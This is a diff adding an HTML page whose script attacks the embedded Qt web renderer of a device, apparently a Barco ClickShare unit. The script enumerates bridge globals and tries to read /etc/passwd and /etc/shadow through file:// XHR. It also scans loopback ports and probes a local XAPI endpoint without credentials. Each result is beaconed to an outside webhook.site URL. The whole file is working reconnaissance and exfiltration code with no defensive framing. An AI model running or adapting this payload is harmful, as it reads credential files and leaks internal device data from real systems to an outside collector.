@@ -1,0 +1,53 @@
+<html><body><script>
+// w2: Qt/QWebChannel bridge + file:// + loopback service probe (no memory corruption needed if a bridge exists)
+var SINK = 'https://webhook.site/11a48cd2-f8e7-445d-96a7-313df77aa438';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,180)), {mode:'no-cors'}); } catch(e) {}
+}
+function names(o){ try { return Object.getOwnPropertyNames(o).slice(0,25).join(','); } catch(e){ return 'ERR'; } }
+
+beacon('start', location.href.slice(0,80));
+
+// --- A: Qt namespace / injected globals ---
+var hits = [];
+try {
+  var all = Object.getOwnPropertyNames(window);
+  for (var i = 0; i < all.length; i++) {
+    if (/^(qt|Qt|webChannel|QWebChannel|bridge|barco|clickshare|native|external|chrome$|cef|widget)/i.test(all[i]) || /channel|bridge|native|qt/i.test(all[i])) hits.push(all[i]);
+  }
+  beacon('globals', 'n=' + all.length + ' hits=' + hits.join(',').slice(0, 150));
+} catch(e){ beacon('globals', 'ERR ' + String(e).slice(0,60)); }
+
+beacon('qt', 'typeof=' + (typeof window.qt) + ' keys=' + (typeof window.qt === 'object' ? names(window.qt) : 'n/a'));
+beacon('wct', 'typeof=' + (typeof window.webChannelTransport) + ' keys=' + (typeof window.webChannelTransport === 'object' ? names(window.webChannelTransport) : 'n/a'));
+beacon('qwc', 'typeof=' + (typeof window.QWebChannel));
+beacon('chrome', 'typeof=' + (typeof window.chrome) + ' keys=' + (typeof window.chrome === 'object' ? names(window.chrome) : 'n/a'));
+
+// --- B: storage / persistence for crash-resume ---
+try { localStorage.setItem('w2', '1'); beacon('ls', 'ok=' + localStorage.getItem('w2')); } catch(e){ beacon('ls', 'ERR ' + String(e).slice(0,50)); }
+
+// --- C: file:// read via sync XHR (would be a direct file-read primitive) ---
+function sxhr(url){
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', url, false);
+    x.send(null);
+    return 'st=' + x.status + ' len=' + (x.responseText || '').length + ' head=' + String(x.responseText || '').slice(0, 40).replace(/[\r\n]/g, ' ');
+  } catch(e){ return 'ERR ' + String(e.name) + ' ' + String(e.message).slice(0, 50); }
+}
+beacon('f-passwd', sxhr('file:///etc/passwd'));
+beacon('f-shadow', sxhr('file:///etc/shadow'));
+beacon('f-data', sxhr('file:///data/'));
+
+// --- D: loopback services (renderer is ON the device; 127.0.0.1 is a secure context, no mixed-content block) ---
+var ports = [4003, 443, 80, 8080, 5000, 3000];
+var res = [];
+for (var p = 0; p < ports.length; p++) {
+  res.push(ports[p] + ':' + sxhr('http://127.0.0.1:' + ports[p] + '/'));
+}
+beacon('loop', res.join(' | ').slice(0, 180));
+
+// --- E: XAPI on loopback WITHOUT credentials (auth bypass test) ---
+beacon('xapi-noauth', sxhr('http://127.0.0.1:4003/v2/configuration/system/status'));
+beacon('done', 'w2-complete');
+</script></body></html>
